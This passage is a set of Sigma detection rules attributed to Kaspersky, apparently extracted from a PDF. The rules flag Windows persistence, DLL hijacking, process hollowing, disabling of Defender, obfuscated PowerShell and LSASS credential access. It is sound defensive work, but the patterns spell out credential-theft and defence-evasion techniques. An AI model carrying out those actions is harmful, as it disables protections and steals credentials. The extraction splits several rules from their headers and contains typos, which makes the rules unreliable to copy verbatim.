attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\nlogsource:\ncategory: registry_event\nproduct: windows\ndetection:\nselection:\nTargetObject|contains:\n- 'HKLM\\System\\\nCurrentControlSet\\Services\\'\n- 'HKLM\\System\\\nControlSet001\\Services\\'\n- 'HKLM\\System\\\nControlSet002\\Services\\'\nfilter:\nDetails|re:\n- (?i)\\\\windows\\\\\n(system32|syswow64|winsxs)\\\\\n- (?i)\\\\Program\\sFiles(\\s\\\n(x86\\))?\\\\\naddition:\nDetails|re:\n- (?i)\\\\Windows\\\\Temp\\\\\ncondition: selection and (addition\nor not filter)\nfalsepositives:\n- Legitimate Software\nlevel: low\n\n\ntitle: Modification of SvcHost\nGroup in Registry\n\nid: 9adfe799-175c-4fb0-85ab4e324e67d0e8\ndescription: detects modification\nof Svchost group in registry\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-06-19\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1543.003\nlogsource:\nproduct: windows\n\n\ntitle: Dynamic-link Library\nInjection via LoadLibrary\n\nid: e917ac0a-9c4f-4110-915d0a77065dbc46\ndescription: Detects remote thread\ncreation with LoadLibrary Start\nFunction\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.DefenseEvasion\n- attack.T1055.001\nlogsource:\nproduct: windows\ncategory: create_remote_thread\n\n\ncategory: registry_set\ndetection:\nselection:\nTargetObject|contains:\n- 'HKLM\\SOFTWARE\\\nWOW6432Node\\Microsoft\\\nWindows NT\\CurrentVersion\\\nSvchost'\n- 'HKLM\\SOFTWARE\\\nMicrosoft\\Windows NT\\\nCurrentVersion\\Svchost'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\ndetection:\nselection:\nStartModule|endswith: '\\\nkernel32.dll'\nStartFunction|startswith:\n'LoadLibrary'\ncondition: selection\nfalsepositives: depends on\nsoftware installed in a system\nlevel: high\n\n\ntitle: IKEEXT service DLL\nHijacking\n\nid: 98129718-781b-415a-9009fc1877310e2b\nstatus: stable\ndescription: Detects IKEEXT service\nDLL hijack.\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1574.001\nauthor: Kaspersky\nmodified: 2023-09-06\n\n\nlogsource:\nproduct: windows\ncategory: image_load\ndetection:\nselection1:\nImage|endswith:\n- 'svchost.exe'\nselection2:\nImageLoaded|contains:\n- 'wlbsctrl.dll'\ncondition: selection1 and\nselection2\nfalsepositives: unknown\nlevel: high\n\n\n-----\n\ntitle: Sigma-Generic-Remote\nThread creation to critical\nWindows process\n\nid: d9efb7f0-1441-4351-b6b950206d637c70\ndescription: Detects remote\nthread creation in critical windows\nprocesses\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.defense_evasion\n- attack.t1055\nlogsource:\nproduct: windows\ncategory: create_remote_thread\ndetection:\nselection:\nTargetImage|endswith:\n- '\\lsm.exe'\n- '\\searchindexer.exe'\n- '\\werfault.exe'\n- '\\regedit.exe'\n- '\\lsaiso.exe'\n- '\\spoolsv.exe'\n- '\\wininit.exe'\n- '\\userinit.exe'\n- '\\smss.exe'\n- '\\csrss.exe'\n- '\\lsass.exe'\n- '\\services.exe'\n- '\\winlogon.exe'\n\n\nfilter1:\nImage:\n- 'C:\\Program Files\\VMware\\\nVMware Tools\\vmtoolsd.exe'\n- 'C:\\Program Files\\Kaspersky\nLab\\Kaspersky Endpoint Security\nfor Windows\\avp.exe'\nfilter2:\nStartModule:\n- 'C:\\Windows\\system32\\\nntdll.dll'\n- 'C:\\Windows\\SysWOW64\\\nntdll.dll'\nStartFunction:\n'EtwpNotificationThread'\nfilter3:\nImage: 'C:\\Windows\\System32\\\ncsrss.exe'\nStartModule:\n- 'C:\\Windows\\System32\\\nKERNELBASE.dll'\n- 'C:\\Windows\\system32\\\nkernel32.dll'\n- 'C:\\Windows\\syswow64\\\nkernel32.dll'\nStartFunction: 'CtrlRoutine'\ncondition: selection and not\n(filter1 or filter2 or filter3)\nfalsepositives: Security Products\nAgents\nlevel: high\n\n\ntitle: Windows Service Path\nModification in Registry\n\nid: 2b19a50f-f81e-40dd-abf35d525c0a7325\ndescription: Adversaries may\ncreate or modify Windows services\nto repeatedly execute malicious\npayloads as part of persistence\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-14\ntags:\n- attack.privilege_escalation\n- attack.persistence\n- attack.t1543.003\n- attack.defense_evasion\n- attack.t1112\nlogsource:\ncategory: registry_set\nproduct: windows\ndetection:\nselection:\nRegistryKey|contains:\n- 'HKLM\\System\\\nCurrentControlSet\\Services\\'\nRegistryValueName:\n- 'ServiceDll'\n- 'ImagePath'\nfilter:\nImage|enswith:\n- '\\sc.exe'\n- '\\services.exe'\n- '\\drvinst.exe'\n- '\\waasmedicagent.exe'\n- '\\handle.exe'\n- '\\handle64.exe'\ncondition: selection and not filter\nfalsepositives:\n- Legitimate Software like\nsecurity scanners and installers\nlevel: low\n\n\ntitle: SessionEnv service DLL\nHijacking\n\nid: 344b40cb-d7eb-4b0d-9dc0cee1cd22263b\nstatus: stable\ndescription: Detects SessionEnv\nservice DLL hijack.\ntags:\n- attack.persistence\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1574.001\nauthor: Kaspersky\nmodified: 2023-09-06\nlogsource:\nproduct: windows\ncategory: image_load\ndetection:\nselection1:\n\n\nImage|endswith:\n- 'svchost.exe'\nselection2:\nImageLoaded|contains:\n- 'TSMSISrv.dll'\n- 'TSVIPSrv.dll'\ncondition: selection1 and\nselection2\nfalsepositives: unknown\nlevel: high\n\n\n-----\n\ntitle: Rundll32 Start with no\nStandard Parameters\n\nid: 99dce9a5-bc55-4a62-b7efb9d1b66b7123\ndescription: Detects rundll32 starts\nwith no standard parameters or\nwithout parameters, it may indicate\nprocess hollowing\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1218.011\n- attack.privilege_escalation\n- attack.t1055.012\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\rundll32.exe'\nfilter:\nCommandLine|contains:\n- ','\n- '.dll'\n- '.cpl'\n- '\\debug.log'\ncondition: selection and not filter\nfalsepositives:\n- unknown\nlevel: high\n\n\ntitle: Sigma-Generic-File\nDeletion Using Ping.exe\n\nid: 32a3e1fb-4bf8-4cf798ca-750068451609\ndescription: detect common\nadversaries method to delay their\nsample deletion\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1070.004\nlogsource:\nproduct: windows\n\n\ntitle: Network Share Deleted\n\nid: 2e6b85ce-fb96-4e23-abb9738a0e7e37a4\ndescription: Detects when a\nnetwork mounted shares is\nremoved via net.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1070.005\nlogsource:\ncategory: process_creation\n\n\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- '\\cmd.exe'\nCommandline|contains:\n- 'ping'\n- 'del '\ncondition: selection\nfalsepositives: unknown\nlevel: high\n\n\nproduct: windows\ndetection:\nselection:\nImage|endswith:\n- '(?i).*net1?(\\.exe)?'\nCommandLine|contains|all:\n- ' use '\n- '/delete'\ncondition: selection\nfalsepositives:\n- Administrators activity\nlevel: medium\n\n\ntitle: Svchost.exe Start with\nno Standard Parameters\n\nid: 4f604047-b78a-4743-8b1f39f036c14fc9\ndescription: detects svchost.exe\nprocess creation with no standard\nor without parameters, it may\nindicate masquerading or process\nhollowing\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1055\n- attack.t1036\n\n\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith: '\\svchost.exe'\nfilter:\nCommandLine|contains: ' -k '\ncondition: selection and not filter\nfalsepositives:\n- Unknown\nlevel: high\n\n\n-----\n\ntitle: Generic-Executing File\nNamed as System Tool in\nUnusual Directory\n\nid: 9487cccb-2c1f-455d-9922e03be1bc7ad0\ndescription: Adversaries may\nmasquerade own malicious process\nlike system process\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1036.005\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- 'ctfmon.exe'\n- 'wuauclt.exe'\n- 'wscript.exe'\n- 'wmiprvse.exe'\n- 'wmiadap.exe'\n- 'winlogon.exe'\n- 'wininit.exe'\n- 'taskhostw.exe'\n- 'taskhost.exe'\n- 'svchost.exe'\n- 'spoolsv.exe'\n- 'smss.exe'\n- 'sihost.exe'\n- 'services.exe'\n- 'searchprotocolhost.exe'\n- 'searchindexer.exe'\n- 'searchfilterhost.exe'\n- 'runlegacycplelevated.exe'\n- 'rundll32.exe'\n- 'regsvr32.exe'\n- 'PowerShell.exe'\n- 'msiexec.exe'\n- 'mshta.exe'\n- 'lsm.exe'\n- 'lsass.exe'\n- 'fontdrvhost.exe'\n- 'dwm.exe'\n- 'dllhost.exe'\n- 'csrss.exe'\n- 'cscript.exe'\n- 'conhost.exe'\n- 'cmd.exe'\n- 'winsat.exe'\n- 'certutil.exe'\n- 'gpresult.exe'\n- 'gpupdate.exe'\n- 'wecutil.exe'\n- 'userinit.exe'\n- 'logonui.exe'\n- 'esentutl.exe'\n\n\n- 'klist.exe'\n- 'audiodg.exe'\n- 'nslookup.exe'\n- 'nbtstat.exe'\n- 'fsiso.exe'\n- 'netstat.exe'\n- 'query.exe'\n- 'srtasks.exe'\n- 'wsmprovhost.exe'\n- 'route.exe'\n- 'certreq.exe'\n- 'auditpol.exe'\n- 'vssadmin.exe'\n- 'qwinsta.exe'\n- 'reg.exe'\n- 'netsh.exe'\n- 'tasklist.exe'\n- 'quser.exe'\n- 'net1.exe'\n- 'net.exe'\n- 'wermgr.exe'\n- 'werfault.exe'\n- 'w32tm.exe'\n- 'at.exe'\n- 'nltest.exe'\n- 'tskill.exe'\n- 'rdpclip.exe'\n- 'whoami.exe'\n- 'taskmgr.exe'\nfilter:\nImage|contains:\n- '\\system32\\'\n- '\\SysWOW64\\'\n- '\\WinSxS\\'\ncondition: selection and not filter\nfalsepositives:\n- Legitimate software activity\nlevel: high\n\n\ntitle: Created Windows\nShell from Critical Windows\nProcess\n\nid: e1948e2f-6bf6-48d9-a59792e7ad9fbd13\ndescription: Anomaly behavior\ncritical windows process\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1036\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nParentImage|endswith:\n- '\\searchindexer.exe'\n- '\\lsaiso.exe'\n- '\\lsm.exe'\n- '\\spoolsv.exe'\n- '\\wininit.exe'\n- '\\smss.exe'\n- '\\csrss.exe'\n- '\\lsass.exe'\n- '\\services.exe'\n- '\\winlogon.exe'\nImage|endswith:\n- '\\PowerShell_ise.exe'\n- '\\cmstp.exe'\n- '\\appvlp.exe'\n- '\\mftrace.exe'\n- '\\scriptrunner.exe'\n- '\\forfiles.exe'\n- '\\msiexec.exe'\n- '\\rundll32.exe'\n- '\\mshta.exe'\n- '\\hh.exe'\n- '\\wmic.exe'\n- '\\regsvr32.exe'\n- '\\scrcons.exe'\n- '\\bash.exe'\n- '\\sh.exe'\n- '\\cscript.exe'\n- '\\wscript.exe'\n- '\\PowerShell.exe'\n- '\\cmd.exe'\ncondition: selection\nfalsepositives: Unknown\nlevel: high\n\n\n-----\n\ntitle: Sigma-Generic-Process\nHollowing\n\nid: 10e74973-1c2f-4199-b90960a5e8792be3\nstatus: stable\ndescription: Detects Process\nHollowing.\nreferences: https://learn.\nmicrosoft.com/en-us/sysinternals/\ndownloads/sysmon\ntags:\n- attack.privilege_escalation\n- attack.defense_evasion\n- attack.t1055.012\nauthor: Kaspersky\nmodified: 2023-09-07\nlogsource:\nproduct: windows\ncategory: process_tampering\ndetection:\nselection:\nType: 'Image is replaced'\nImage|contains:\n- '\\System32\\'\ncondition: selection\nfalsepositives:\n- Legitimate software (e.g.\nbrowsers, MS Teams) can produce\nthis activity, but they rarely placed\nin system32 folder.\nlevel: high\n\n\ntitle: Anomaly in the\nWindows Critical Process\nTree\n\nid: 69858e0f-5d79-4b23-af9675554ba8cfe8\ndescription: Anomaly in childs/\nparents critical process windows\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1036\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- \"csrss.exe\"\nselection2:\nParentImage|contains:\n- '\\smss.exe'\nselection3:\nImage|endswith:\n- \"\\explorer.exe\"\nselection4:\nParentImage|endswith:\n- '\\userinit.exe'\n- '\\winlogon.exe'\n- '\\runtimebroker.exe'\n- '\\explorer.exe'\nselection5:\nImage|endswith:\n- \"lsass.exe\"\n- \"lsm.exe\"\n- \"LsaIso.exe\"\n- \"services.exe\"\nselection6:\nParentImage|endswith:\n- 'wininit.exe'\nselection7:\nImage|endswith:\n- \"smss.exe\"\nselection8:\nParentImage|endswith:\n- 'smss.exe'\n- 'system'\nselection9:\nImage|endswith:\n- \"svchost.exe\"\n- \"taskhost.exe\"\nselection10:\nParentImage|endswith:\n- 'services.exe'\n- 'svchost.exe'\nselection11:\nImage|endswith:\n- \"taskhostw.exe\"\nselection12:\n\n\nParentImage|endswith:\n- 'svchost.exe'\n- 'taskhostw.exe'\nselection13:\nImage|endswith:\n- \"wininit.exe\"\n- \"winlogon.exe\"\nselection14:\nParentImage|endswith:\n- 'smss.exe'\nselection15:\nImage|endswith:\n- \"RuntimeBroker.exe\"\nselection16:\nParentImage|endswith:\n- 'RuntimeBroker.exe'\n- 'svchost.exe'\ncondition: (selection1 and not\nselection2) or (selection3 and not\nselection4) or (selection5 and not\nselection6) or\n(selection7 and not\nselection8) or (selection9 and not\nselection10) or (selection11 and not\nselection12) or\n(selection13 and not\nselection14) or (selection15 and not\nselection16)\nfalsepositives: Unknown\nlevel: high\n\n\n-----\n\ncategory: registry_event\ndetection:\nselection:\nEventType: SetValue\nTargetObject|endswith:\n- '\\services\\wscsvc\\Start'\n- '\\services\\sharedaccess\\\nStart'\n- '\\services\\usbstor\\Start'\n- '\\services\\mpssvc\\Start'\n- '\\services\\windefend\\Start'\n- '\\services\\wuauserv\\Start'\n- '\\services\\wersvc\\Start'\nDetails: 'DWORD\n(0x00000004)'\ncondition: selection\nfalsepositives: Legitimate Software\nlevel: high\n\n\ntitle: Disabling Windows\nDefender via Registry\n\nid: ec5b9e1e-d805-4d33-91162d903a3debe6\ndescription: Detects registry\nmodification to disable Windows\nDefender\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Defense Evasion\n- attack.T1562.001\n- attack.T1112\nlogsource:\nproduct: windows\ncategory: registry_event\ndetection:\nselection:\nEventType: SetValue\nTargetObject|endswith:\n- '\\Microsoft\\Windows\nDefender\\DisableAntiSpyware'\n- '\\Microsoft\\Windows\nDefender\\DisableAntiVirus'\n- '\\Microsoft\\Windows\nDefender\\Real-Time Protection\\\nDisableBehaviorMonitoring'\n- '\\Microsoft\\Windows\nDefender\\Real-Time Protection\\\nDisableOnAccessProtection'\n- '\\Microsoft\\Windows\nDefender\\Real-Time Protection\\\nDisableScanOnRealtimeEnable'\n- '\\Microsoft\\Windows\nDefender\\Real-Time Protection\\\nDisableIOAVProtection'\n- '\\Microsoft\\Windows\nDefender\\Real-Time Protection\\\nDisableRealtimeMonitoring'\n- '\\Microsoft\\Windows\nDefender\\Real-Time Protection\\\nDisableRoutinelyTakingAction'\n- '\\Microsoft\\\nWindows Defender\\Spynet\\\nDisableBlockAltFirstSeen'\n- '\\Microsoft\\\nWindows Defender\\Spynet\\\nDisableEnhancedNotifications'\n- '\\Microsoft\\\nWindows Defender\\Spynet\\\nDisableRoutinelyTakingAction'\nDetails: 'DWORD\n(0x00000001)'\ncondition: selection\nfalsepositives: Legitimate System\nAdministrator actions\nlevel: high\n\n\ntitle: Disabling Critical\nService\n\nid: 7b9ed9dd-33bf-412b-89e48a6e36397ad3\ndescription: Detects registry\nmodification to disable Critical\nWindows Service\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Defense Evasion\n- attack.T1562.001\n- attack.T1112\nlogsource:\nproduct: windows\n\n\ntitle: Disabling SmartScreen\nProtection via Registry\n\nid: ab8e7b82-92a2-443e-b07abc5eed304ede\ndescription: Detects registry\nmodification to disable\nSmartScreen Protection\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Defense Evasion\n- attack.T1562.001\n- attack.T1112\nlogsource:\nproduct: windows\n\n\ncategory: registry_event\ndetection:\nselection1:\nEventType: SetValue\nTargetObject|endswith:\n'SmartScreenEnabled'\nDetails: 'Off'\nselection2:\nEventType: SetValue\nTargetObject|endswith:\n'EnableSmartScreen'\nDetails: 'DWORD\n(0x00000000)'\ncondition: selection1 or selection2\nfalsepositives:\n- YandexRescueTool\nlevel: high\n\n\ntitle: Windows Defender\nExclusions Modification via\nRegistry\n\nid: fd350d1b-558b-4a41-9514f45ee9d8cb10\ndescription: Detects registry\nmodification for add exclusion on\nWindows Defender\nauthor: Kaspersky\nstatus: stable\ntags:\n- attack.Defense Evasion\n- attack.T1562.001\n- attack.T1112\n\n\nlogsource:\nproduct: windows\ncategory: registry_event\ndetection:\nselection:\nEventType: SetValue\nTargetObject|contains:\n- '\\Microsoft\\Windows\nDefender\\Exclusions\\Paths'\n- '\\Microsoft\\Windows\nDefender\\Microsoft\\Antimalware\\\nExclusions\\Paths'\ncondition: selection\nfalsepositives: Legitimate System\nAdministrator actions\nlevel: high\n\n\n-----\n\ntitle: Disabling Windows\nDefender via Dism\n\nid: 3c97398f-af96-478c-b0cf8427b8221703\ndescription: Detects disabling\nWindows Defender via dism.exe\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Defense Evasion\n- attack.T1562.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith: '\\dism.exe'\nCommandLine|contains|all:\n- '/Disable-Feature'\n- 'Windows-Defender'\nfilter:\n\n\nParentImage|contains:\n- '\\bignox\\bignoxvm\\rt\\disablefeatures.bat'\ncondition: selection and not filter\nfalsepositives:\n- unknown\nlevel: high\n\n\ntitle: Sigma-GenericWindows Defender\nModification via PowerShell\n\nid: d1ce878e-36da-40b4-aa54a94f05449da0\ndescription: Detects disabling or\nmodification Windows Defender via\nPowerShell\nauthor: Kaspersky\nstatus: stable\ntags:\n- attack.Defense Evasion\n- attack.T1562.001\n- attack.Execution\n- attack.T1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- '\\PowerShell.exe'\nselection2:\nCommandLine|contains|all:\n- 'Add-MpPreference'\n- 'Exclusion'\nselection3:\nCommandLine|contains|all:\n- 'Set-MpPreference'\n- 'Exclusion'\nselection4:\nCommandLine|contains:\n- 'DisableIOAVProtection'\n- 'DisableRemovableDrive\nScanning'\n- 'DisableIntrusionPrevention\nSystem'\n- 'DisableRealtimeMonitoring'\n- 'DisableScanningMapped\nNetworkDrivesForFullScan'\n- 'DisableScanningNetwork\nFiles'\n- 'DisableCatchupFullScan'\n- 'DisableCatchupQuickScan'\n- 'DisableEmailScanning'\n- 'DisableScriptScanning'\n- 'DisableBehaviorMonitoring'\n- 'DisableArchiveScanning'\nselection5:\nCommandLine|contains|all:\n- 'Uninstall-WindowsFeature'\n- 'Windows-Defender'\ncondition: selection1 and\n(selection2 or selection3 or\nselection4 and selection5)\nfalsepositives: Legitimate System\nAdministrator actions\nlevel: high\n\n\ntitle: Generic-Encoded/\ndecoded PowerShell Code\nExecution (ps_script)\n\nid: d9a401fc-9ee4-4074-8e9ea48b29d1471a\ndescription: Adversaries may use\nObfuscated Files via Encoded/\nDecoded PowerShell\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n- attack.t1027\n- attack.t1140\nlogsource:\nproduct: windows\ncategory: ps_script\ndetection:\nselection:\nScriptBlockText|contains:\n- ' -e '\n- ' -en '\n- ' -enc '\n- ' -enco '\n- ' -encod '\n- ' -encode '\n- ' -encoded '\n\n\n- ' -encodedc '\n- ' -encodedco '\n- ' -encodedcom '\n- ' -encodedcomm '\n- ' -encodedcomma '\n- ' -encodedcomman '\n- ' -encodedcommand '\n- 'FromBase64String'\n- 'ToBase64String'\ncondition: selection\nfalsepositives:\n-unknown\nlevel: high\n\n\n-----\n\ntitle: Created Windows\nShell from Critical Windows\nProcess\n\nid: e1948e2f-6bf6-48d9-a59792e7ad9fbd13\ndescription: Anomaly behavior\ncritical windows process\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1036\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nParentImage|endswith:\n- '\\searchindexer.exe'\n- '\\lsaiso.exe'\n- '\\lsm.exe'\n- '\\spoolsv.exe'\n- '\\wininit.exe'\n- '\\smss.exe'\n- '\\csrss.exe'\n- '\\lsass.exe'\n- '\\services.exe'\n- '\\winlogon.exe'\nImage|endswith:\n- '\\PowerShell_ise.exe'\n- '\\cmstp.exe'\n- '\\appvlp.exe'\n- '\\mftrace.exe'\n- '\\scriptrunner.exe'\n- '\\forfiles.exe'\n- '\\msiexec.exe'\n- '\\rundll32.exe'\n- '\\mshta.exe'\n- '\\hh.exe'\n- '\\wmic.exe'\n- '\\regsvr32.exe'\n- '\\scrcons.exe'\n- '\\bash.exe'\n- '\\sh.exe'\n- '\\cscript.exe'\n- '\\wscript.exe'\n- '\\PowerShell.exe'\n- '\\cmd.exe'\ncondition: selection\nfalsepositives: Unknown\nlevel: high\n\n\ntitle: Generic-XOR-ed\nPowerShell Command\n\nid: 1ffb9142-4a7a-4f45-99a6c881c2804907\ndescription: detects XOR-ed\nPowerShell Command\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.t1140\n- attack.execution\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection:\nImage|endswith:\n- 'PowerShell.exe'\n- 'pwsh.exe'\nCommandLine|contains|all:\n- 'bxor'\n\n\ntitle: Generic-Obfuscation\nvia Escape Characters in\nCommand Line\n\nid: a0e302d9-a2ff-4443-8f3925951a052faf\ndescription: Detects suspicious\nescape characters in commandline\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.defense_evasion\n- attack.t1027\n- attack.t1140\n- attack.execution\n- attack.t1059\n- attack.t1059.001\nlogsource:\nproduct: windows\ncategory: process_creation\ndetection:\nselection1:\nImage|endswith:\n- 'cmd.exe'\nCommandLine|re:\n- '\\w\\^\\w{1,5}\\^\\w'\n- '\\w\\\"\\w{1,5}\\\"\\w'\n\n\n- 'char'\n- 'join'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\nselection2:\nImage|endswith:\n- 'PowerShell.exe'\n- 'pwsh.exe'\nCommandLine|re:\n- '\\w`\\w{1,5}`\\w'\ncondition: selection1 or selection2\nfalsepositives:\n- unknown\nlevel: high\n\n\n-----\n\ntitle: Generic-XOR-ed\nPowerShell Command (ps_\nscript)\n\nid: 39e540a4-a3c2-4e1d-8a2743159a1d53fb\ndescription: Detects XOR-ed\nPowerShell Command\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.execution\n- attack.t1059.001\n- attack.defense_evasion\n\n\n- attack.t1027\n- attack.t1140\nlogsource:\nproduct: windows\ncategory: ps_script\ndetection:\nselection:\nScriptBlockText|contains|all:\n- 'bxor'\n- 'char'\n- 'join'\ncondition: selection\nfalsepositives:\n- unknown\nlevel: high\n\n\ntitle: LSASS Memory Access\nvia Leaked Handle Seclogon\n\nid: 7e4942c2-2ce9-4d30-b33c7bd35e3bbdd2\ndescription: Detects svchost.exe\nprocess access LSASS memory\nwith specific rights\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.credential_access\n- attack.t1003.001\nlogsource:\ncategory: process_access\n\n\nproduct: windows\ndetection:\nselection:\nTargetImage|endswith: '\\lsass.\nexe'\nSourceImage|endswith: '\\\nsvchost.exe'\nCallTrace|contains: '*seclogon.\ndll*'\nGrantedAccess|re: '(?i)^0x\\\nw*[4c]\\w$'\ncondition: selection\nfalsepositives:\n- Unknown\nlevel: high\n\n\ntitle: Image Loaded into\nlsass.exe\n\nid: 95d7b51d-c3cd-4dea-89cd8d2fd2a4b93a\ndescription: Detects unsigned\nimage loaded into LSASS process\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-07-18\ntags:\n- attack.Credential_Access\n- attack.T1003.001\nlogsource:\ncategory: image_load\nproduct: windows\ndetection:\nselection:\nImage|endswith: '\\lsass.exe'\nfilter:\nSigned: 'True'\nSignatureStatus: 'Valid'\nSignature:\n- 'Microsoft Windows Hardware\nCompatibility Publisher'\n- 'Microsoft Windows'\n- 'Microsoft Corporation'\n- 'VMware, Inc.'\n- 'CRYPTO-PRO'\n- 'Microsoft Windows Publisher'\n- 'LLC Crypto-Pro'\n- 'Crypto-Pro'\n- 'CRYPTO-PRO LLC'\n- 'Microsoft Windows Software\nCompatibility Publisher'\ncondition: selection and not filter\nfalsepositives:\n- Legitimate software DLL loaded\ninto lsass.exe; update the whitelist\nwith it by SHA256 or Signature\nlevel: medium\n\n\ntitle: Creating Windows\nService appearing to be\nlegitimate\n\nid: e9054728-ac7c-4996-b9a54ca41ee53d38\nstatus: experimental\ndescription: detects suspicious\ndescription for Windows Service\ntags:\n- attack.defense_evasion\n- attack.t1036.004\nauthor: Kaspersky\nmodified: 2023-09-08\nlogsource:\nproduct: windows\ncategory: registry_set\n\n\ndetection:\nselection:\nTargetObject|endswith:\n- '\\Description'\nDetails|contains:\n- 'if '\nDetails|contains:\n- ' stop'\n- ' disable'\ncondition: selection\nfalsepositives:\n- microsoft edge elevation\nservice\nlevel: high\n\n\n-----\n\ntitle: Suspicious LSASS\nMemory Access\n\nid: 44462b8d-39af-4b9a-856c2aeffba81bff\ndescription: Detects process\naccess LSASS memory with read/\nwrite rights\nauthor: Kaspersky\nstatus: stable\nmodified: 2023-08-02\ntags:\n- attack.credential_access\n- attack.t1003.001\nlogsource:\ncategory: process_access\nproduct: windows\ndetection:\nselection:\nTargetImage|endswith: '\\lsass.\nexe'\nGrantedAccess|re: '(?i)0x\\\nw*[1235679abdef]\\w(\\s|$)'\nwhitelist:\nSourceImage|endswith:\n- '\\wbem\\wmiprvse.exe'\n- '\\csrss.exe'\n- '\\wininit.exe'\n- '\\lsm.exe'\n- '\\logonui.exe'\n- '\\msiexec.exe'\n- '\\siworktm_host64.exe'\n- '\\tphkload.exe'\n- '\\scenarioengine.exe'\n- '\\officeclicktorun.exe'\n- '\\filesinusehelper.exe'\n- '\\bct.exe'\n- '\\apphelpercap.exe'\n- '\\filesinusehelper.exe'\n- '\\msert.exe'\n- '\\sisidsservice.exe'\n- '\\vmtoolsd.exe'\n- '\\vmware-updatemgr.exe'\n- '\\ccsvchst.exe'\n- '\\appdynamics.coordinator.\nexe'\n- '\\symerr.exe'\n- '\\google\\update\\\ngoogleupdate.exe'\n- '\\microsoft\\edgeupdate\\\nmicrosoftedgeupdate.exe'\n- '\\dropbox\\update\\\ndropboxupdate.exe'\n- '\\websense\\websense\nendpoint\\wepsvc.exe'\n- '\\zscaler\\zsatunnel\\\nzsatunnel.exe'\n- '\\adobe\\adobegcclient\\\nagmservice.exe'\n- '\\installflashplayer.exe'\n- '\\flashplayerinstaller.exe'\n\n\n- '\\adobearmhelper.exe'\n- '\\adobearm.exe'\n- '\\armsvc.exe'\n- '\\kavfswp.exe'\n- '\\kaspersky lab\\\nnetworkagent\\vapm.exe'\n- '\\kaspersky lab\\kaspersky\nsecurity center\\vapm.exe'\n- '\\kaspersky lab\\\nnetworkagent\\kldumper.exe'\n- '\\kaspersky lab\\\nnetworkagent\\klnagent.exe'\n- '\\avp.exe'\n- '\\kaspersky lab\\kaspersky\nendpoint security for windows\\\nkldw.exe'\n- '\\kaspersky lab\\kaspersky\nendpoint security for windows\\\navpsus.exe'\n- '\\cisco\\cisco anyconnect\nsecure mobility client\\vpnagent.\nexe'\n- '\\cisco\\cisco anyconnect\nsecure mobility client\\\nacwebsecagent.exe'\n- '\\lenovo\\imcontroller\\\nservice\\lenovo.modern.\nimcontroller.exe'\n- '\\tensor company ltd\\\nsbis3plugin\\sbis3plugin.exe'\n- '\\bitdefender\\endpoint\nsecurity\\epupdateservice.exe'\n- '\\bitdefender\\endpoint\nsecurity\\epsecurityservice.exe'\n- '\\teamviewer\\update\\\nupdate.exe'\n- '\\tkauduservice64.exe'\n- '\\ccm\\ccmexec.exe'\n- '\\ccm\\sensorlogontask.exe'\n- '\\collectguestlogs.exe'\n- '\\Microsoft\\Windows\nDefender\\Platform\\*\\MsMpEng.\nexe'\ncondition: selection and not\nwhitelist\nfalsepositives:\n- Legitimate software accessing\nLSASS process for legitimate\nreason or with excessive rights;\nupdate the whitelist with it\nlevel: high\n\n\ntitle: Lsass Dump via LOLBin\n\nid: 2fe9cd33-d7f1-4d52-ab11e40cb359ad02\ndescription: detects lsass dump\nvia lolbins such as procdump.exe,\ndotnet-dump.exe, dumpminitool.\nexe\nreferences:\n- 